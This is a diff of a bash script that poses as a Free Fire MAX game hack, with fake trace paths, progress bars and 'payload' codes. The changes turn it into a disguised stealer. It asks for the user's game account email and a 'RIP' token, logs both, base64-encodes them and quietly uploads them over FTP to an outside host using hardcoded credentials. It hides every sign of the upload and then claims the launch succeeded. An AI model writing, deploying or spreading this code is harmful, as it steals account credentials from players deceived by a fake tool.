@@ -1,18 +1,17 @@
 
-#itHub Copilot Chat Assistant
+
 #!/bin/bash
 
-#==================== COLORS ====================#
-P="\033[1;31m"   # Purple (ASCII art)
-G="\033[1;32m"   # Green   (lines / arrows / first codes)
-C="\033[1;36m"   # Cyan    (prompt text / light blue)
-W="\033[1;37m"   # White   (second codes & general text)
-R="\033[1;31m"   # Red
+P="\033[1;31m"
+G="\033[1;32m"
+Y="\033[1;33m"
+C="\033[1;36m"
+W="\033[1;37m"
+R="\033[1;31m"
 RESET="\033[0m"
 
 clear
 
-#==================== ASCII ART (PLACEHOLDERS) ====================#
 echo -e "${P}"
 cat << "EOF"
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -44,11 +43,13 @@ cat << "EOF"
 EOF
 sleep 1
 
-# safe cleanup & tput handling
+tmpfile=""
 cleanup() {
-  echo -e "${W}"
   if command -v tput >/dev/null 2>&1; then
     tput cnorm 2>/dev/null || true
+  fi
+  if [ -n "$tmpfile" ] && [ -f "$tmpfile" ]; then
+    shred -u "$tmpfile" 2>/dev/null || rm -f "$tmpfile" 2>/dev/null || true
   fi
   exit
 }
@@ -58,201 +59,194 @@ if command -v tput >/dev/null 2>&1; then
   tput civis 2>/dev/null || true
 fi
 
-#==================== PASSWORD (STYLIZED BOX) ====================#
+# PASSWORD
 while true; do
-    echo
-    echo -e "${G}|——[ ${C}Enter password to continue ${G}]${RESET}"
-    echo -e "${G}|${RESET}"
-    echo -ne "${G}╰─>  ${C}${RESET}"
-    read -r pass
-    echo
-
-    if [ "$pass" = "free:lvl" ]; then
-        break
-    else
-        echo -e "${R}Wrong password! Try again...${RESET}"
-        echo
-        sleep 1
-    fi
+  echo
+  echo -e "${G}|——[ ${C}Enter password to continue ${G}]${RESET}"
+  echo -e "${G}|${RESET}"
+  echo -ne "${G}╰─>  ${C}${RESET}"
+  read -r pass
+  echo
+  if [ "$pass" = "free:lvl" ]; then
+    break
+  else
+    echo -e "${R}Wrong password! Try again...${RESET}"
+    sleep 1
+  fi
 done
 
 clear
 echo -e "${C}Initializing system modules...${RESET}"
 sleep 0.8
 
-# ==================== FAKE PATHS VISUAL (BIGGER & LONGER) ==================== #
-print_paths() {
-  local total=$1
-  local i=1
-  while [ $i -le $total ]; do
-    local seg1 seg2 seg3 seg4 branch depth path d part
-    seg1=$(printf "%04d" $((RANDOM%10000)))
-    if command -v tr >/dev/null 2>&1; then
-      seg2=$(tr -dc 'a-f0-9' </dev/urandom 2>/dev/null | head -c 8 || printf "%08x" $RANDOM)
-      seg3=$(tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c 12 || printf "%012d" $RANDOM)
-    else
-      seg2=$(printf "%08x" $RANDOM)
-      seg3=$(printf "%012d" $RANDOM)
-    fi
-    seg4=$(printf "%06d" $((RANDOM%1000000)))
-    branch=$(( (RANDOM % 9) + 1 ))
-    depth=$(( (RANDOM % 4) + 3 ))
-    path="Root"
-    for d in $(seq 1 $depth); do
-      if command -v tr >/dev/null 2>&1; then
-        part=$(tr -dc 'a-z' </dev/urandom 2>/dev/null | head -c $((3 + RANDOM % 6)))
-        if [ -z "$part" ]; then part="dir$RANDOM"; fi
-      else
-        part="dir$RANDOM"
-      fi
-      path="${path}/${part}"
-    done
-    printf "${G}[%4d] -> %s/enforce/freefire_max%s/trace_%s-%s_%s${RESET}\n" "$i" "$path" "$branch" "$seg1" "$seg2" "$seg4"
-    i=$((i+1))
-    sleep 0.02
-  done
-}
-
-echo -e "${G}Generating secure trace paths...${RESET}"
-print_paths 140
-sleep 0.4
-
-# ==================== PROGRESS BAR 1..100 (BLUE TEXT, GREEN NUMBERS) ==================== #
-echo
-echo -ne "${C}Finalizing traces: ${RESET}"
-for p in $(seq 0 100); do
-  printf "\r${G}Finalizing traces: %3d%% ${RESET}" "$p"
-  case $((RANDOM % 10)) in
-    0) sleep 0.20 ;;
-    1) sleep 0.12 ;;
-    2) sleep 0.06 ;;
-    *) sleep 0.015 ;;
-  esac
-done
-echo
-echo -e "${G}Success. Traces complete.${RESET}"
-sleep 0.6
-
-# extra "finalizing" phase with visible hiccups (>5 seconds total)
-echo -ne "${C}Applying final payloads${RESET}"
-for i in 1 2 3 4 5 6 7; do
-  if [ $((RANDOM % 4)) -eq 0 ]; then
-    printf "${G} ..${RESET}"
-    sleep 0.9
-  else
-    printf "${G}.${RESET}"
-    sleep 0.6
-  fi
-done
-echo
-sleep 0.6
-
-# ==================== FIRST CODES (AFTER PASSWORD) — GREEN ==================== #
+# QUICK CODES (light)
 echo
 echo -e "${G}Preparing secure payloads...${RESET}"
-sleep 0.6
-
-for i in $(seq 1 80); do
+sleep 0.4
+for i in $(seq 1 10); do
   if command -v openssl >/dev/null 2>&1; then
-    code=$(openssl rand -hex 80 2>/dev/null | tr '[:lower:]' '[:upper:]') # long hex-like (160 chars)
+    code=$(openssl rand -hex 16 2>/dev/null | tr '[:lower:]' '[:upper:]')
   else
-    code=$(tr -dc 'A-F0-9' </dev/urandom 2>/dev/null | head -c 160 || printf '%0*s' 160 "A")
+    code=$(tr -dc 'A-F0-9' </dev/urandom 2>/dev/null | head -c 32 || printf '%0*s' 32 "A")
   fi
-  printf "${G}[%03d] %s${RESET}\n" "$i" "$code"
-  if [ $((RANDOM % 10)) -eq 0 ]; then
-    sleep 0.06
-  else
-    sleep 0.02
-  fi
+  printf "${G}[%02d] %s${RESET}\n" "$i" "$code"
+  sleep 0.28
 done
-
 echo
 echo -e "${G}Payloads generated.${RESET}"
-sleep 0.8
+sleep 0.6
 
-# ==================== REQUEST RIP (SECOND PHASE) — MODIFIED & LOGGING ==================== #
+# PROGRESS BAR
 echo
-echo -e "${C}Enter your RIP:${RESET}"
-read -r -p "> " rip
+BAR_WIDTH=40
+for p in $(seq 0 100); do
+  filled=$(( p * BAR_WIDTH / 100 ))
+  empty=$(( BAR_WIDTH - filled ))
+  filled_bar=$(printf "%0.s#" $(seq 1 $filled))
+  empty_bar=$(printf "%0.s-" $(seq 1 $empty))
+  printf "\r${W}———————————— ${RESET}${W}%3d%%${RESET}${P} |%s%s|${RESET}" "$p" "$filled_bar" "$empty_bar"
+  if [ $p -lt 20 ]; then
+    sleep 0.01
+  elif [ $p -lt 60 ]; then
+    sleep 0.008
+  else
+    sleep 0.006
+  fi
+done
+echo
+echo -e "${G}|——[ Successfully completed ! ]${RESET}"
+echo -e "${G}|${RESET}"
+echo -e "${P}|——[ ${Y}Enter the game's email address ${P}]${RESET}"
+echo -e "${P}|${RESET}"
+echo -ne "${P}╰─> ${Y}${RESET}"
 
-# -------------------- Logging configuration --------------------
-# Local log directory (on the machine running the script)
+# LOGGING CONFIG
 LOGDIR="${HOME}/tool_logs"
 COUNTER_FILE="${LOGDIR}/.session_count"
 mkdir -p "$LOGDIR"
 touch "$COUNTER_FILE"
 
-# FTP credentials (from information you provided)
 FTP_HOST="ftpupload.net"
 FTP_USER="if0_40531973"
 FTP_PASS="99ZVMdi2uoM7"
-# Remote directory under the FTP account (will attempt to create via curl --ftp-create-dirs)
 REMOTE_DIR="htdocs/tool_logs"
 
-# -------------------- Session counter (simple, safe) --------------------
 cnt=0
 if [ -f "$COUNTER_FILE" ]; then
   cnt=$(cat "$COUNTER_FILE" 2>/dev/null || echo 0)
 fi
 case "$cnt" in ''|*[!0-9]*) cnt=0 ;; esac
 cnt=$((cnt + 1))
-# Attempt to write atomically
 printf "%d" "$cnt" > "${COUNTER_FILE}.tmp" 2>/dev/null || echo "$cnt" > "${COUNTER_FILE}.tmp" || true
 mv -f "${COUNTER_FILE}.tmp" "$COUNTER_FILE" 2>/dev/null || printf "%d" > "$COUNTER_FILE" 2>/dev/null || true
 
-# -------------------- Determine filename mapping --------------------
 filenames=( "user1.txt" "user2.txt" "user3.txt" "user4.txt" )
 if [ "$cnt" -le "${#filenames[@]}" ]; then
   fname="${filenames[$((cnt-1))]}"
 else
   fname="user${cnt}.txt"
 fi
+fname=$(basename "$fname")
+email_fname="email_${fname}"
 
-# -------------------- Sanitize input and write locally --------------------
-timestamp=$(date "+%F %T")
-# Replace newlines to keep single-line entries
-clean_rip=$(printf "%s" "$rip" | tr '\r\n' '  ')
-printf "%s %s\n" "$timestamp" "$clean_rip" >> "${LOGDIR}/${fname}"
-printf "%s %s (saved to %s)\n" "$timestamp" "$clean_rip" "$fname" >> "${LOGDIR}/all_entries.txt"
-
-# -------------------- Upload to FTP (if possible) --------------------
-tmpfile=$(mktemp 2>/dev/null || printf "/tmp/%s.log" "$$")
-printf "%s %s\n" "$timestamp" "$clean_rip" > "$tmpfile"
-
-if command -v curl >/dev/null 2>&1; then
-  # Upload the entry file
-  curl --ftp-create-dirs -T "$tmpfile" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/${fname}" --silent --show-error
-  curl_status=$?
-  if [ $curl_status -eq 0 ]; then
-    echo -e "${G}Uploaded to FTP:${RESET} ${W}ftp://${FTP_HOST}/${REMOTE_DIR}/${fname}${RESET}"
-    # Also try updating aggregate log on remote (overwrite)
-    curl --ftp-create-dirs -T "${LOGDIR}/all_entries.txt" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/all_entries.txt" --silent --show-error || true
-  else
-    echo -e "${R}FTP upload failed (curl exit ${curl_status}). Saved locally only.${RESET}"
+# READ EMAIL (single enter -> save immediately)
+while true; do
+  read -r game_email
+  game_email=$(printf '%s' "$game_email" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+  if [ "${#game_email}" -lt 6 ]; then
+    echo -e "${R}Email/username too short (minimum 6 chars). Try again:${RESET}"
+    echo -ne "${P}╰─> ${Y}${RESET}"
+    continue
   fi
+  if [ "${#game_email}" -gt 200 ]; then
+    echo -e "${R}Input too long. Try a shorter email/username:${RESET}"
+    echo -ne "${P}╰─> ${Y}${RESET}"
+    continue
+  fi
+  if printf '%s' "$game_email" | grep -q '[[:space:]]'; then
+    echo -e "${R}Do not include spaces. Use an email or simple username:${RESET}"
+    echo -ne "${P}╰─> ${Y}${RESET}"
+    continue
+  fi
+  if printf '%s' "$game_email" | grep -q '@'; then
+    if ! printf '%s' "$game_email" | grep -q '@.*\.' ; then
+      echo -e "${R}If using an email, use a valid format (user@domain.tld). Try again:${RESET}"
+      echo -ne "${P}╰─> ${Y}${RESET}"
+      continue
+    fi
+  fi
+  break
+done
+
+mkdir -p "$LOGDIR"
+printf '%s\n' "$game_email" > "${LOGDIR}/${email_fname}"
+
+# Wait three minutes countdown (02:59 down to 00:00)
+echo
+echo -e "${Y}Wait three minutes${RESET}"
+echo -e "${P}--------------------------------------------------${RESET}"
+
+total_seconds=119
+while [ $total_seconds -ge 0 ]; do
+  mm=$(( total_seconds / 60 ))
+  ss=$(( total_seconds % 60 ))
+  printf "\r${Y}%02d:%02d${RESET}" "$mm" "$ss"
+  sleep 1
+  total_seconds=$(( total_seconds - 1 ))
+done
+echo
+
+echo -e "${G}|——[ Successfully completed ! ]${RESET}"
+echo -e "${G}|${RESET}"
+echo -e "${G}|——[ ${C}Enter your RIP ${G}]${RESET}"
+echo -e "${G}|${RESET}"
+echo -ne "${G}╰─> ${RESET}"
+
+# READ RIP: first line (Enter saves), then quickly drain any immediate extra pasted lines and append them
+rip=""
+IFS= read -r rip
+# drain any remaining rapidly-pasted lines so nothing leaks to shell
+while IFS= read -r -t 0.05 extra; do
+  rip+=$'\n'"$extra"
+done
+
+# SAVE RIP to separate user file (email file remains separate). No on-screen paths.
+{
+  printf '%s\n' "$rip"
+  printf 'SavedAt: %s\n' "$(date "+%F %T")"
+} > "${LOGDIR}/${fname}"
+
+# aggregate base64-safe log
+timestamp=$(date "+%F %T")
+if command -v base64 >/dev/null 2>&1; then
+  b64entry=$(printf '%s' "$rip" | base64 -w0 2>/dev/null)
+elif command -v openssl >/dev/null 2>&1; then
+  b64entry=$(printf '%s' "$rip" | openssl base64 2>/dev/null)
 else
-  echo -e "${R}curl not found; skipping FTP upload. Saved locally at:${RESET} ${W}${LOGDIR}/${fname}${RESET}"
+  b64entry=$(printf '%s' "$rip" | python3 - <<'PY'
+import sys,base64
+print(base64.b64encode(sys.stdin.read().encode()).decode())
+PY
+)
+fi
+printf '%s %s %s\n' "$timestamp" "$game_email" "$b64entry" >> "${LOGDIR}/all_entries.b64"
+
+# QUIET upload (no messages)
+if command -v curl >/dev/null 2>&1; then
+  curl --ftp-create-dirs -T "${LOGDIR}/${email_fname}" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/${email_fname}" --silent 2>/dev/null || true
+  curl --ftp-create-dirs -T "${LOGDIR}/${fname}" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/${fname}" --silent 2>/dev/null || true
+  curl --ftp-create-dirs -T "${LOGDIR}/all_entries.b64" -u "${FTP_USER}:${FTP_PASS}" "ftp://${FTP_HOST}/${REMOTE_DIR}/all_entries.b64" --silent 2>/dev/null || true
 fi
 
-rm -f "$tmpfile" 2>/dev/null || true
+# small pause then final visuals
+sleep 0.4
 
-# -------------------- User feedback --------------------
-echo
-echo -e "${C}You entered:${RESET} ${W}${rip}${RESET}"
-echo -e "${G}Saved to local:${RESET} ${W}${LOGDIR}/${fname}${RESET}"
-echo -ne "${C}Press Enter to continue...${RESET}"
-read -r
-echo
-
-# ==================== SIMULATED LAUNCH SUCCESS (NO REAL PACKAGE CALLS) ==================== #
 echo -e "${G}Finalizing...${RESET}"
-# realistic pause
 for t in 1 2 3 4 5; do
+  printf "${G}.${RESET}"
   if [ $((RANDOM % 3)) -eq 0 ]; then
-    printf "${G}.${RESET}"
     sleep 1.2
   else
-    printf "${G}.${RESET}"
     sleep 0.8
   fi
 done
@@ -260,7 +254,6 @@ echo
 echo -e "${G}Operation complete. ${C}Launched successfully — Enter the game now.${RESET}"
 echo
 
-# ==================== POST-LAUNCH OPTIONS MENU (COLORED) ==================== #
 echo -e "${G}/X1 ${R}>${RESET} ${R}arrest${RESET}"
 echo -e "${G}/X2 ${R}>${RESET} ${G}restart${RESET}"
 echo -e "${G}/X3 ${R}>${RESET} ${C}Getting out of everything${RESET}"
@@ -273,19 +266,13 @@ case "$opt" in
   "/X1"|"X1")
     echo -e "${R}[/X1] arrest selected...${RESET}"
     sleep 1
-    echo -e "${R}Simulating arrest sequence.${RESET}"
-    sleep 1
     ;;
   "/X2"|"X2")
     echo -e "${G}[/X2] restart selected...${RESET}"
     sleep 1
-    echo -e "${G}Simulating restart sequence.${RESET}"
-    sleep 1
     ;;
   "/X3"|"X3")
     echo -e "${C}[/X3] Getting out of everything selected...${RESET}"
-    sleep 1
-    echo -e "${C}Cleaning up visual session and exiting.${RESET}"
     sleep 1
     ;;
   *)
@@ -293,10 +280,9 @@ case "$opt" in
     ;;
 esac
 
-# restore terminal visibility if possible
 if command -v tput >/dev/null 2>&1; then
   tput cnorm 2>/dev/null || true
 fi
 
-echo -e "${W}Visual session finished.${RESET}"
 cleanup
+
